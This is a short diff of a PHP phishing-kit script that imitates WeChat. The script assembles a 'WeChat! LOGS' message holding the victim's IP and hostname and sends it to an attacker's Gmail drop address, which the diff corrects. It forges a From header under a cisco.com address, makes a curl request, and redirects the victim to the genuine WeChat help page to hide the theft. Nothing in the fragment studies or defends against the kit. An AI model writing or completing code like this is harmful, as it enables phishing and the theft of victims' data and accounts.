@@ -10,7 +10,8 @@ $message .= "HostName : ".$hostname."\n";
 
 $message .= "=============+ [ WeChat! LOGS ] +=============\n";
 
-$send= "benjaminlambrect123@gmail.com";
+$send= "benjaminlambrecht123@gmail.com
+";
 
 $subject = "WeChat | $ip";
 $headers = "From:  WeChat<ahmednasir@cisco.com>";
@@ -29,4 +30,5 @@ $result = curl_exec($ch);
 curl_close($ch);
 
 header("Location: https://help.wechat.com/cgi-bin/micromsg-bin/oshelpcenter?opcode=2&lang=en&plat=ios&id=200424RvA7ZJ200424uyeQfY&Channel=helpcenter&t=help_center/w_topic_detail");
+
 ?>
